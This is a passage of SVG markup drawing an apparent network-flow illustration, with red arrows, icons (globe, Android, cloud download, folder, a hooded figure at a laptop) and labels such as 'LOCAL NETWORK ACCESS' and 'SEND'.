r="0.89" fill="#d60000"/><circle cx="686.6" cy="36.62" r="0.89" fill="#d60000"/><circle cx="689.89" cy="36.62" r="0.89" fill="#d60000"/><circle cx="693.17" cy="36.62" r="0.89" fill="#d60000"/><circle cx="696.46" cy="36.62" r="0.89" fill="#d60000"/><circle cx="699.74" cy="36.62" r="0.89" fill="#d60000"/><circle cx="703.03" cy="36.62" r="0.89" fill="#d60000"/><circle cx="680.03" cy="30.05" r="0.89" fill="#d60000"/><circle cx="683.32" cy="30.05" r="0.89" fill="#d60000"/><circle cx="686.6" cy="30.05" r="0.89" fill="#d60000"/><circle cx="689.89" cy="30.05" r="0.89" fill="#d60000"/><circle cx="693.17" cy="30.05" r="0.89" fill="#d60000"/><circle cx="696.46" cy="30.05" r="0.89" fill="#d60000"/><circle cx="699.74" cy="30.05" r="0.89" fill="#d60000"/><circle cx="703.03" cy="30.05" r="0.89" fill="#d60000"/><circle cx="680.03" cy="23.48" r="0.89" fill="#d60000"/><circle cx="683.32" cy="23.48" r="0.89" fill="#d60000"/><circle cx="686.6" cy="23.48" r="0.89" fill="#d60000"/><circle cx="689.89" cy="23.48" r="0.89" fill="#d60000"/><circle cx="693.17" cy="23.48" r="0.89" fill="#d60000"/><circle cx="696.46" cy="23.48" r="0.89" fill="#d60000"/><circle cx="699.74" cy="23.48" r="0.89" fill="#d60000"/><circle cx="703.03" cy="23.48" r="0.89" fill="#d60000"/><circle cx="680.03" cy="16.91" r="0.89" fill="#d60000"/><circle cx="683.32" cy="16.91" r="0.89" fill="#d60000"/><circle cx="686.6" cy="16.91" r="0.89" fill="#d60000"/><circle cx="689.89" cy="16.91" r="0.89" fill="#d60000"/><circle cx="693.17" cy="16.91" r="0.89" fill="#d60000"/><circle cx="696.46" cy="16.91" r="0.89" fill="#d60000"/><circle cx="699.74" cy="16.91" r="0.89" fill="#d60000"/><circle cx="703.03" cy="16.91" r="0.89" fill="#d60000"/><line x1="677.58" y1="13.29" x2="705.48" y2="13.29" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><text transform="translate(442.43 386.65)" font-size="12" fill="#d60000" font-family="Arial-BoldMT, Arial" font-weight="700">LOCA<tspan x="34" y="0" letter-spacing="-0.02em">L</tspan><tspan x="41.11" y="0"> </tspan><tspan x="0" y="14.4">NETWORK </tspan><tspan x="0" y="28.8">ACCESS</tspan></text><line x1="295.69" y1="194.59" x2="311.09" y2="194.59" fill="none" stroke="#ffaf10" stroke-miterlimit="10" stroke-width="2"/><rect x="303.61" y="243.59" width="63.05" height="19.82" fill="#fcf1e0"/><rect x="263.91" y="139.77" width="143.11" height="22.57" fill="#fcf1e0" stroke="#ffaf10" stroke-miterlimit="10" stroke-width="2"/><line x1="339.7" y1="150.97" x2="350.6" y2="150.97" fill="none" stroke="#ffaf10" stroke-miterlimit="10" stroke-width="2"/><line x1="355.76" y1="150.97" x2="366.66" y2="150.97" fill="none" stroke="#ffaf10" stroke-miterlimit="10" stroke-width="2"/><line x1="371.7" y1="150.97" x2="382.6" y2="150.97" fill="none" stroke="#ffaf10" stroke-miterlimit="10" stroke-width="2"/><line x1="387.76" y1="150.97" x2="398.66" y2="150.97" fill="none" stroke="#ffaf10" stroke-miterlimit="10" stroke-width="2"/><ellipse cx="285.01" cy="151.06" rx="13.4" ry="5.26" fill="#fff" stroke="#ffaf10" stroke-miterlimit="10" stroke-width="2"/><rect x="295.69" y="203.54" width="78.14" height="33.93" fill="none" stroke="#ffaf10" stroke-miterlimit="10" stroke-width="2"/><path d="M326.41,255.4a2.64,2.64,0,0,1-.2,1,2.1,2.1,0,0,1-.57.78,2.44,2.44,0,0,1-.93.5,4,4,0,0,1-1.25.18,5.19,5.19,0,0,1-1.2-.13,4.13,4.13,0,0,1-1.07-.39V255.7l.57.26a5.77,5.77,0,0,0,.58.22,4.73,4.73,0,0,0,.59.16,3,3,0,0,0,.59.06,1.53,1.53,0,0,0,.51-.07.84.84,0,0,0,.35-.19.67.67,0,0,0,.19-.28,1.1,1.1,0,0,0,.06-.37.82.82,0,0,0-.1-.42,1.31,1.31,0,0,0-.28-.35,3.22,3.22,0,0,0-.45-.31l-.58-.33c-.18-.09-.38-.2-.61-.34a3.15,3.15,0,0,1-.63-.49,2.69,2.69,0,0,1-.49-.72,2.31,2.31,0,0,1-.2-1,2.59,2.59,0,0,1,.19-1,2.23,2.23,0,0,1,.54-.77,2.59,2.59,0,0,1,.85-.47,3.62,3.62,0,0,1,1.13-.17,5.85,5.85,0,0,1,.6,0,5.6,5.6,0,0,1,.59.12,4.36,4.36,0,0,1,.58.19,6.19,6.19,0,0,1,.61.26l-.59,1.41-.49-.22-.45-.16-.42-.09a2,2,0,0,0-.42,0,1,1,0,0,0-.7.25.88.88,0,0,0-.25.64.93.93,0,0,0,.08.39.92.92,0,0,0,.23.31,2.54,2.54,0,0,0,.42.3c.17.1.37.22.62.35s.56.31.81.47a4.24,4.24,0,0,1,.63.54,2,2,0,0,1,.41.67A2.39,2.39,0,0,1,326.41,255.4Z" fill="#ffaf10"/><path d="M332.94,257.78H328v-8.56h4.94v1.48h-3.12v1.88h2.9v1.49h-2.9v2.21h3.12Z" fill="#ffaf10"/><path d="M342,257.78h-2.3l-3.37-6.48h-.05l.06.9c0,.25,0,.52,0,.8s0,.53,0,.75v4h-1.63v-8.56H337l3.36,6.41h0c0-.3,0-.59,0-.88,0-.12,0-.25,0-.38s0-.26,0-.39v-.38c0-.12,0-.23,0-.33v-4.05H342Z" fill="#ffaf10"/><path d="M350.75,253.42a5.53,5.53,0,0,1-.3,1.9,3.5,3.5,0,0,1-.85,1.36,3.58,3.58,0,0,1-1.37.83,5.86,5.86,0,0,1-1.85.27h-2.26v-8.56h2.51a5.28,5.28,0,0,1,1.7.26,3.52,3.52,0,0,1,1.3.8,3.58,3.58,0,0,1,.83,1.32A5.3,5.3,0,0,1,350.75,253.42Zm-1.84,0a5,5,0,0,0-.14-1.23,2.47,2.47,0,0,0-.42-.86,1.67,1.67,0,0,0-.67-.5,2.29,2.29,0,0,0-.9-.17h-.84v5.58h.67a2.09,2.09,0,0,0,1.72-.7A3.27,3.27,0,0,0,348.91,253.46Z" fill="#ffaf10"/><line x1="295.69" y1="188.59" x2="311.09" y2="188.59" fill="none" stroke="#ffaf10" stroke-miterlimit="10" stroke-width="2"/><line x1="295.69" y1="182.59" x2="311.09" y2="182.59" fill="none" stroke="#ffaf10" stroke-miterlimit="10" stroke-width="2"/><line x1="316.1" y1="194.59" x2="350.6" y2="194.59" fill="none" stroke="#ffaf10" stroke-miterlimit="10" stroke-width="2"/><line x1="316.1" y1="188.59" x2="350.6" y2="188.59" fill="none" stroke="#ffaf10" stroke-miterlimit="10" stroke-width="2"/><line x1="316.1" y1="182.59" x2="350.6" y2="182.59" fill="none" stroke="#ffaf10" stroke-miterlimit="10" stroke-width="2"/><path d="M547.1,254.46a14.77,14.77,0,1,0,14.77,14.76A14.78,14.78,0,0,0,547.1,254.46Zm-14,15.12h6.48a26.19,26.19,0,0,0,.86,6.49h-5.56A14,14,0,0,1,533.07,269.58Zm14.62-7.86v-6.48c2.18.38,4.07,2.88,5.19,6.48Zm5.4.72a25.52,25.52,0,0,1,.84,6.42h-6.24v-6.42Zm-6.12-.72h-5.64c1.19-3.85,3.27-6.44,5.64-6.53Zm0,.72v6.42h-6.7a26.47,26.47,0,0,1,.84-6.42Zm-7.42,6.42h-6.48a14,14,0,0,1,1.74-6.42h5.58A26.67,26.67,0,0,0,539.55,268.86Zm.72.72H547v6.49h-5.84A26.47,26.47,0,0,1,540.27,269.58Zm6.7,7.21v6.46c-2.36-.09-4.43-2.64-5.63-6.46Zm.72,0h5.17c-1.12,3.57-3,6-5.17,6.42Zm0-.72v-6.49h6.24a25.54,25.54,0,0,1-.86,6.49Zm7-6.49h6.48a14,14,0,0,1-1.77,6.49H553.8A26.2,26.2,0,0,0,554.65,269.58Zm0-.72a25.71,25.71,0,0,0-.84-6.42h5.58a14,14,0,0,1,1.74,6.42Zm4.3-7.14H553.6a12.23,12.23,0,0,0-3.8-6.28A14.06,14.06,0,0,1,559,261.72Zm-14.54-6.28a12.23,12.23,0,0,0-3.81,6.28h-5.35A14.05,14.05,0,0,1,544.41,255.44Zm-9.12,21.35h5.33a12.14,12.14,0,0,0,3.79,6.21A14,14,0,0,1,535.29,276.79ZM549.8,283a12.13,12.13,0,0,0,3.78-6.21h5.34A14.08,14.08,0,0,1,549.8,283Z" fill="#9160a5"/><line x1="263.91" y1="253.08" x2="265.41" y2="253.08" fill="none" stroke="#cbd0d1" stroke-miterlimit="10"/><line x1="268.22" y1="253.08" x2="300.49" y2="253.08" fill="none" stroke="#cbd0d1" stroke-miterlimit="10" stroke-dasharray="2.81 2.81"/><line x1="301.89" y1="253.08" x2="303.39" y2="253.08" fill="none" stroke="#cbd0d1" stroke-miterlimit="10"/><line x1="368.02" y1="253.08" x2="369.52" y2="253.08" fill="none" stroke="#d60000" stroke-miterlimit="10"/><line x1="372.33" y1="253.08" x2="404.6" y2="253.08" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-dasharray="2.81 2.81"/><line x1="406" y1="253.08" x2="407.5" y2="253.08" fill="none" stroke="#d60000" stroke-miterlimit="10"/><polyline points="407.5 253 420.09 252.63 420.09 223.72 461.09 223.72 461.09 237.41 507.09 237.54 507.09 216.29 521.5 216.29" fill="none" stroke="#d60000" stroke-miterlimit="10"/><polygon points="438.75 217.74 447.56 223.74 438.56 229.74 438.75 217.74" fill="#d60000"/><polygon points="481.15 231.05 489.97 237.05 480.97 243.05 481.15 231.05" fill="#d60000"/><polygon points="480.09 359.71 474.09 368.52 468.09 359.52 480.09 359.71" fill="#d60000"/><polygon points="620.4 357.23 614.4 366.04 608.4 357.04 620.4 357.23" fill="#d60000"/><polygon points="684.17 294.13 692.98 300.13 683.98 306.13 684.17 294.13" fill="#d60000"/><polygon points="695.03 125.44 703.84 131.44 694.84 137.44 695.03 125.44" fill="#d60000"/><polygon points="590 76.17 598.82 82.17 589.82 88.17 590 76.17" fill="#d60000"/><polygon points="490.59 63.52 496.59 54.7 502.59 63.7 490.59 63.52" fill="#d60000"/><polyline points="426.97 396.37 419.84 396.37 419.84 380.93 426.97 380.93" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><line x1="414.35" y1="388.57" x2="433.26" y2="388.57" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><rect x="410.13" y="385.74" width="4.05" height="5.4" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><rect x="433.26" y="385.74" width="4.05" height="5.4" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><rect x="426.97" y="378.23" width="4.05" height="5.4" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><rect x="426.97" y="393.67" width="4.05" height="5.4" fill="none" stroke="#d60000" stroke-miterlimit="10" stroke-width="0.5"/><polygon points="516.09 210.77 524.9 216.77 515.9 222.77 516.09 210.77" fill="#d60000"/><path d="M61.53,209.63c-1.5-1.75-5-5-5.26-6.63-.72-3.75,10.93-14.17,38-10.12,26.36,3.93,30.68,23.43,33.13,29.75,6.76,17.46-4,21.66-4.59,28-.92,9.18.82,16.75,6.73,16.63-3.31,6-10.57,1.17-11-1.54-2.61.43-3.9,5.91.6,10.75-3.93,1.94-8.61-2.57-8.68-7.39-5.34,3.3-3.25,7.75-1.84,10.14-2.91-.45-5-1.36-5.71-2.75" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M81.93,217.25c20.47-1.75,36.62,9,34.87,14,.88-2.28,3.86-3.12,6.61-1.56,2.45,1.39,3.18,14.87-6.57,19.37-.25,4-3.28,8.44-4.79,11.18-1.27,2.31-10.62,16.24-23.62,16.24s-20.31-9.11-23-12.85c-2.88-4-5.25-12.63-5.25-14.63-1.75-.5-12.21-1.59-8-17,3-4,4.05-.25,7-.12-.75-6.13.5-14.9,6-18.15,0,0-.41,6.58,2.08,6.83,0-6.5,4.5-16.52,9-15.51-3.14,3-4,11.26-1,14.51.25-9.25,7-15.12,9.75-15.18C79.51,212.81,81.93,217.25,81.93,217.25Z" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M70.19,269.09s2.93,8.16,1,15.39c-1.88,7-10.75,8-25,11C37.6,296.64,19.93,332.23,19.93,346c0,6.5,18.71,40.33,18.71,40.33" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M104.79,269.09a23.6,23.6,0,0,0-1.07,15.39c2.1,7,10.75,8,25,11,16.88,6.54,24.2,43.32,27.55,55.15-1.83,10-19.2,35.74-19.2,35.74" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M87.19,292.23c.4,0,.79,0,1.17,0,7.5-.16,11.72-1.91,16-5.36-.65-1.55-1.27-5.93-.9-7.18,10.42.3,24.42,10.19,20.16,14.27-1.6,1.54-21.45,8-36.47,7s-37.36-3.89-39.6-8.17c-2.18-3.58,13.63-17.71,24.13-13.58.62,1-1.09,6.41-1.22,7.63C74.73,291.48,81.68,292.56,87.19,292.23Z" fill="#4c5054" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><polygon points="125.03 321.69 53.36 321.69 53.18 311.18 125.03 310.14 125.03 321.69" fill="#4c5054"/><polygon points="127.93 334.74 49.88 334.74 49.67 331.17 126.81 331.17 127.93 334.74" fill="#4c5054"/><polyline points="141.75 379.09 150.2 379.09 137.06 406.83 39.25 406.83 24.19 379.09 33.57 379.09" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><polygon points="30.63 334.54 145.08 334.54 133.91 406.83 41.8 406.83 30.63 334.54" fill="#fff" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><polyline points="24.19 379.09 39.25 411.07 137.06 411.07 150.2 379.09" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M35.91,307.46c2.86,5.6,15.23,14.06,17.45,14.23S56.27,312,56.27,312c-7.44-3.78-12.84-8.14-14.63-13.14Z" fill="#4c5054"/><path d="M29.88,315.94c4.64,5.92,24.14,16.79,26.39,16.2-.51,1.59-2.92,2.6-3.75,2.6.33.36-17.25-.93-17.25-.93s-11-5.4-10-7.84C26.42,323.16,30.29,315.89,29.88,315.94Z" fill="#4c5054"/><path d="M21,338.8c1.42,1.17,9.59,4.32,10.94,4-.06.8,1.11,9.64,1.11,9.64s-11.24.48-12.83-1.85C20.43,347.81,21,338.8,21,338.8Z" fill="#4c5054"/><path d="M26.47,363c5.4.09,8.33-1.41,8.2-2.29s1.16,7.56,1.16,7.56,3.6,4.2-4.32,4.78C28.77,370.46,26.47,363,26.47,363Z" fill="#4c5054"/><path d="M140.55,307.46c-2.86,5.6-13.3,14.06-15.52,14.23s-5.84-8.83-5.84-8.83c7.5-2.17,13.84-9.05,15.64-14.05Z" fill="#4c5054"/><path d="M145.83,317.14c-4.64,5.92-19.64,15.17-21.89,14.59.51,1.58-.83,3,0,3-.33.36,17.25-.93,17.25-.93s9.25-4.45,8.25-6.88C148.29,324.11,145.42,317.09,145.83,317.14Z" fill="#4c5054"/><path d="M153.28,339.56c-1.42,1.17-7.38,3.56-8.73,3.28.06.8-1.11,9.64-1.11,9.64s11.24.48,12.83-1.85C156,347.81,153.28,339.56,153.28,339.56Z" fill="#4c5054"/><path d="M151.51,362.39c-5.4.1-9.85-.85-9.72-1.73s-1.16,7.56-1.16,7.56-2.57,3.45,5.35,4C148.73,369.71,151.51,362.39,151.51,362.39Z" fill="#4c5054"/><path d="M56.27,204.38c-3.59,1.62-19.68,21.68-6.22,46.25,2.71,4.93.48,14.43-5.28,14.68,6.45,5.75,12.19-2.88,11.47-5.07,3.56,0,2,11.74-3.06,15.07,8.35,1.17,11.42-3.19,10.75-6.22,1.13,0,6.08,4.39,1.16,8.89,1.92,2.45,6.63-1.5,6.63-1.5" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M63.93,269.09c1.13,0,4.09,5.55,0,9.14,4.49,1.8,7.79-1.75,7.79-1.75" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><line x1="83.01" y1="261.21" x2="92.95" y2="261.21" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><line x1="59.18" y1="231.88" x2="66.41" y2="239.11" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><line x1="84.24" y1="239.23" x2="91.11" y2="239.23" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><line x1="108.71" y1="238.67" x2="117.75" y2="229.63" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><rect x="66" y="236.5" width="18.24" height="8.56" fill="#4c5054" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><rect x="91.11" y="236.5" width="18.19" height="8.56" fill="#4c5054" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M102.43,375l.35-.07h0c.35-.06.69-.1,1-.14l.17,0,.38-.05h0l.33-.06h0a3.26,3.26,0,0,0,.8-.25,1.68,1.68,0,0,0,.87-.93,1.43,1.43,0,0,0,.1-.93,1.48,1.48,0,0,0-.64-.82,2.21,2.21,0,0,0-.06-.62,1.62,1.62,0,0,0-1.12-1.31,2,2,0,0,0-.41-.05,1.94,1.94,0,0,0-1.5.83,4.72,4.72,0,0,1-1.44,1.14l-.74.35v0s-.28.12-.52.23l-1.52.68c.28-4.33,2.21-8,.17-10.8s-5.8-3.51-9.39-3.58h-.87a16.55,16.55,0,0,0-5.3.89l-.19.07A7.73,7.73,0,0,0,79.56,362c-1.68,2.22-.41,4.93.29,8.05l.08.36a13,13,0,0,1,.3,2.36,4.51,4.51,0,0,1,0,.52v.05a4.94,4.94,0,0,0,.57,2.37A32.9,32.9,0,0,0,76,374c-1.93-.5-3.56-.19-3.66-1.83a.93.93,0,0,1,.67-.72,1.41,1.41,0,0,0,.51.65,1.46,1.46,0,0,1,.38-2.39c1.25-.24,1.18,1,2.93,2,1,.52,2.11,1.09,3.37,1.68v0a4.34,4.34,0,0,0,0-.51c-1.17-.55-2.24-1.09-3.12-1.57a3.87,3.87,0,0,1-.54-.34l-.15-.12a5.81,5.81,0,0,1-.7-.72,2,2,0,0,0-1.47-.9,2.12,2.12,0,0,0-.42,0,1.63,1.63,0,0,0-1.17,1.26,2.25,2.25,0,0,0-.08.62,1.34,1.34,0,0,0-.72,1.1,1.78,1.78,0,0,0,1,1.59,5.14,5.14,0,0,0,1.73.45c.44.07.89.14,1.36.26a38.08,38.08,0,0,1,5.36,2h0A9.87,9.87,0,0,0,83,378.27l.08.06.31.26.18.18-.12.05-.83.29-.11,0a37.68,37.68,0,0,1-5,1.4,24.62,24.62,0,0,1-2.7.31,7,7,0,0,0-2.13.34,1.76,1.76,0,0,0-1.08,1.64,2,2,0,0,0,.46,1.41,1.61,1.61,0,0,0,.74.49,2.22,2.22,0,0,0,0,.73,1.57,1.57,0,0,0,.94,1.21,2.52,2.52,0,0,0,.87.2,1.64,1.64,0,0,0,.6-.1l.36-.16a5.64,5.64,0,0,0,1-.84A11,11,0,0,1,79,384a30.78,30.78,0,0,1,4.15-1.87l1-.38.44-.16h0l.36-.13.09,0s.47.45.63.56a5.93,5.93,0,0,0,3.53.92c2.12,0,3.25-.52,4-1.26h0c1.18.48,2.36,1,3.45,1.5.49.22,1.76.91,1.76.91l.58.34a10.94,10.94,0,0,1,2.25,1.9c.61.65,1.1,1.16,1.91,1.17a2.26,2.26,0,0,0,.88-.16,1.46,1.46,0,0,0,.84-.74,1.83,1.83,0,0,0,.19-.65,2.18,2.18,0,0,0,0-.51h0a1.72,1.72,0,0,0,.71-.45,2,2,0,0,0,.52-1.39,1.77,1.77,0,0,0-1-1.68,6.78,6.78,0,0,0-2.11-.43l-.47,0-.75-.09-.28,0v0c-.37-.06-.76-.13-1.18-.23a27.4,27.4,0,0,1-3.26-1l-.77-.28L94.72,379h0a1.29,1.29,0,0,1,.19-.21,7.57,7.57,0,0,1,.72-.53c.36-.25,1.34-1,1.34-1a5.88,5.88,0,0,0,.61-.69h0c.33-.13.66-.26,1-.37l.11-.05c.59-.22,1.17-.42,1.71-.6l.08,0C101.18,375.27,101.84,375.09,102.43,375Zm-18,6.11h0l-.6.22-.52.2-.44.17h0a36,36,0,0,0-3.32,1.42s0,0-.16.08-.46.24-.67.37c-2.87,1.64-3,3.38-4.71,2.68-1-.39-.77-2-.14-2.58a1.48,1.48,0,0,0-.52.69,1.31,1.31,0,0,1-1.2-1.44c.15-1.88,2-1.24,5.22-1.78l.14,0,.14,0a43.78,43.78,0,0,0,6.27-1.86l.08,0,0,.09c.29.47.45,1.08.78,1.66h0ZM89,382.71h0Zm.13-.59.08-.11A.76.76,0,0,1,89.12,382.12Zm7.2-1.93.55.2h0l.21.07h0l.11,0h0l.45.16a26.63,26.63,0,0,0,2.75.81,15.27,15.27,0,0,0,1.56.28l.44.06,1,.1h.07c1.5.17,2.33.33,2.39,1.59a1.3,1.3,0,0,1-1.25,1.39,1.45,1.45,0,0,0-.5-.7,2,2,0,0,1,.37,1.94v0a1,1,0,0,1-.6.58c-1.78.63-1.8-1.1-4.6-2.86l-.65-.39c-.46-.26-1.94-1-1.94-1-1-.47-2.07-.92-3.13-1.35a11.6,11.6,0,0,0,.91-1.72Zm.2-3.18h0Zm1.48-3.8c0,.18,0,.37,0,.57s0,.27,0,.41a3.34,3.34,0,0,1-.54,1.89,3.25,3.25,0,0,1-1,.95c-.91.57-1.94.75-2.32,1.11a2,2,0,0,0-.34.49,3.22,3.22,0,0,0-.21.46A3.45,3.45,0,0,1,93,380a2.67,2.67,0,0,1,0,.93.62.62,0,0,1-.36.33l-.11,0-.12-.05a1,1,0,0,1-.1-.59v-.08l-.06,0v0a5.18,5.18,0,0,1,0,.55c0,.43-.56.8-.6-.24,0,0,0-.09,0-.14l-.11,0v.08c0,.51.15,1-.35,1.09s-.41-.37-.36-1l-.3,0c0,.56.28,1.23-.49,1.22a.87.87,0,0,1-.31-.05c-.27-.1-.25-.55-.25-.55,0-.17,0-.36,0-.59h-.31c0,.49.21,1-.29,1.15h-.2c-.72,0-.57-.47-.51-1.22L88,381c0,.53.08,1.12-.35,1s-.4-.45-.36-1.13l-.1,0c0,.44,0,.83-.3.77s-.32-.31-.3-.74a1.34,1.34,0,0,1,0-.2l-.06,0a1.66,1.66,0,0,1,0,.24c0,.68-.4.3-.56.2a.56.56,0,0,1-.27-.45,1.61,1.61,0,0,1,0-.22,1.89,1.89,0,0,0,0-.27,2.21,2.21,0,0,1-.46-.63v0c-.11-.21-.2-.43-.31-.64a3,3,0,0,0-.28-.44l-.07-.09c-.32-.36-1.23-.68-2.07-1.28a4,4,0,0,1-1-1,3.56,3.56,0,0,1-.61-2.15,1.69,1.69,0,0,0,0-.23c0-.19,0-.38,0-.57l0-.34a9.89,9.89,0,0,1,.61-2.27h0a1.69,1.69,0,0,1,.12-.28l.07-.16v0c1.07-2.24,1.24-4,.86-5.06l-.28-.33c-.16.36-.45,1.85-1,3.72l0,.19c-.13.49-.27,1-.43,1.51a.76.76,0,0,0,0,.11l-.14.54c0,.09,0,.19-.07.28,0-.11,0-.22-.07-.33l-.14-.6c-.66-2.66-1.53-5-.09-6.94a8.55,8.55,0,0,1,2-1.89s1.07-.68,1.34-.81A12.33,12.33,0,0,1,94.06,360a.23.23,0,0,1,.21.1,9.65,9.65,0,0,1,3.88,3.07,5.62,5.62,0,0,1,.44.79l.1.26c.7,1.92.07,4.16-.38,6.71,0-.2-.08-.4-.14-.6-.52-2-.84-3.8-1-4.79l-.08-.33c-.07-.34-.14-.5-.18-.43a2.89,2.89,0,0,0-.19.35,6.13,6.13,0,0,0-.22.81,8.41,8.41,0,0,0,.86,4.33A9.44,9.44,0,0,1,98,373,1.79,1.79,0,0,1,98,373.21Zm.85,2.32-.18.06-.64.24a4.9,4.9,0,0,0,.52-2.18.49.49,0,0,1,0-.12v0c.44-.19.87-.37,1.28-.56l.66-.3,1.09-.52c1.79-.89,1.77-2.16,3-1.87a1.46,1.46,0,0,1,.28,2.4,1.39,1.39,0,0,0,.53-.63.93.93,0,0,1,.65.74c-.09.94-.66,1.22-1.49,1.37l-.61.08c-.37,0-.77.09-1.19.16h0l-.43.08A27.58,27.58,0,0,0,98.85,375.53Z" fill="#4c5054"/><path d="M90.78,377.39l-.13-.7c-.23-1.21-1-2.25-1.37-2.26s-1,.78-1.34,1.76a2.12,2.12,0,0,0-.11.45v.05a11.68,11.68,0,0,0-.27,2.06c0,.46.16.41.38.17l.2-.24.09-.11h0l0-.06h0l.09-.12c.3-.38.62-.78.87-.77s.42.24.66.53l.19.25c.57.75,1.06,1.49.8-.42C90.84,377.81,90.81,377.61,90.78,377.39Z" fill="#4c5054"/><path d="M88.36,370.9c-.15-.92-1.14-.93-3.9-1.43a1.64,1.64,0,0,0-.44,0h-.08l-.21.05-.25.1a3.33,3.33,0,0,0-1.54,2.95v0a3,3,0,0,0,.06.59v0h0a3.39,3.39,0,0,0,.11.43s0,.05,0,.08a1.89,1.89,0,0,0,.39.66,2,2,0,0,0,.7.51,5,5,0,0,0,1.5.26,3.65,3.65,0,0,0,.55-.05h.12a4.7,4.7,0,0,0,.74-.18A3.36,3.36,0,0,0,88.36,370.9Z" fill="#4c5054"/><path d="M96.54,371.56l0,0c0-.14-.09-.28-.14-.41h0l-.07-.17a3.81,3.81,0,0,0-.23-.4l0,0h0a1.87,1.87,0,0,0-1.78-.93l-.88.12h-.05l0,0h0l0,0c-2.08.27-2.85.35-3,1.15a3.4,3.4,0,0,0,2.08,4.11,4.8,4.8,0,0,0,2.35.24,3.06,3.06,0,0,0,.7-.22l.11-.05,0,0h0l.19-.11.26-.24.06-.07a1.91,1.91,0,0,0,.32-.56,3.78,3.78,0,0,0,.13-2.25Z" fill="#4c5054"/><circle cx="75.68" cy="295.03" r="2.22" fill="#fff"/><circle cx="100.21" cy="295.03" r="2.22" fill="#fff"/><path d="M73.46,295c4.13,6,3,28.55,0,34" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M102.42,294c-2,1.73-.21,31,1.54,35.11" fill="none" stroke="#4c5054" stroke-miterlimit="10" stroke-width="2"/><path d="M606.85,269.66a2.73,2.73,0,0,0,2.73,2.73h.13v3.76a1.67,1.67,0,0,0,3.33,0v-3.76h2.41v3.76a1.66,1.66,0,0,0,3.32,0v-3.76h.54a2.73,2.73,0,0,0,2.73-2.73V258.55H606.85Z" fill="#159c80"/><path d="M604.47,258.17a1.67,1.67,0,0,0-1.66,1.66v7.73a1.67,1.67,0,0,0,3.33,0v-7.73A1.67,1.67,0,0,0,604.47,258.17Z" fill="#159c80"/><path d="M624.32,258.17a1.66,1.66,0,0,0-1.66,1.66v7.73a1.66,1.66,0,1,0,3.32,0v-7.73A1.66,1.66,0,0,0,624.32,258.17Z" fill="#159c80"/><path d="M618.54,251.87l1.05-2.46a.29.29,0,0,0-.15-.39.31.31,0,0,0-.39.16l-1,2.4a7.38,7.38,0,0,0-3.41-.83h-.34a7.29,7.29,0,0,0-3.1.68l-1-2.25a.29.29,0,0,0-.38-.16.31.31,0,0,0-.16.39l1,2.28a7.44,7.44,0,0,0-3.8,6.48H622A7.44,7.44,0,0,0,618.54,251.87ZM611,255.25a.73.73,0,1,1,.72-.73A.72.72,0,0,1,611,255.25Zm7,0a.73.73,0,1,1,.73-.73A.73.73,0,0,1,618,255.25Z" fill="#159c80"/><path d="M482.28,23.1a4.6,4.6,0,0,0-3.08-1.24c-.26-2.21-2-4.46-4.32-4.46h-.63c-.46-2.27-2.55-3.1-4.42-3.1a4.28,4.28,0,0,0-4.26,3.45h-.78a4.49,4.49,0,0,0-3.16,1.47,4.55,4.55,0,0,0-1.29,2.8,4.77,4.77,0,0,0-2.93,1.47,4.06,4.06,0,0,0-1.2,3,4.49,4.49,0,0,0,4.34,4.43H479a4.56,4.56,0,0,0,3.16-1.41,4.67,4.67,0,0,0,1.42-3.29A4.27,4.27,0,0,0,482.28,23.1Zm-.6,5.87a3.84,3.84,0,0,1-2.65,1.2H460.55a3.79,3.79,0,0,1-3.63-3.75,3.32,3.32,0,0,1,1-2.44,3.94,3.94,0,0,1,2.77-1.26h.37l0-.37a3.69,3.69,0,0,1,1.09-2.64,3.84,3.84,0,0,1,2.65-1.25h1.41l0-.31a3.52,3.52,0,0,1,3.6-3.14c.8,0,3.43.21,3.77,2.79l0,.31h1.24c2,0,3.55,2.17,3.63,4.13l0,.35h.36a3.86,3.86,0,0,1,2.9,1,3.57,3.57,0,0,1,1.11,2.57A4,4,0,0,1,481.68,29Z" fill="#d60000"/><polygon points="470.13 27.75 470.13 17.75 469.42 17.75 469.42 27.66 466.45 24.69 465.95 25.19 469.82 29.06 473.81 25.07 473.31 24.57 470.13 27.75" fill="#d60000"/><path d="M667.23,421.3H649.68l-4.08-14.5h3.21l-.72-3.83h5.59l1.15,1.69h13.8v14.27Zm-17-.77h16.33l-1.13-11.37H653.6l-1-1.59h-6ZM654,408.4h12.11l1.13,11.32.59-1V405.42H654.43l-1.16-1.68H649l.58,3.06h3.49Z" fill="#d60000"/><path d="M758.66,96.93a4.54,4.54,0,0,0,2.18-4,3.92,3.92,0,1,0-7.77,0,4.51,4.51,0,0,0,2.37,4.1c-2.17,2.89-6.4.19-6.4,9,0,0,15.14,0,16.48,0C765.52,98.72,760.86,100.05,758.66,96.93Z" fill="none" stroke="#d60000" stroke-miterlimit="10"/><polygon points="757.28 106.42 755.87 104.77 756.7 98.88 755.93 97.81 756.71 97.14 757.4 97.14 758.24 97.77 757.57 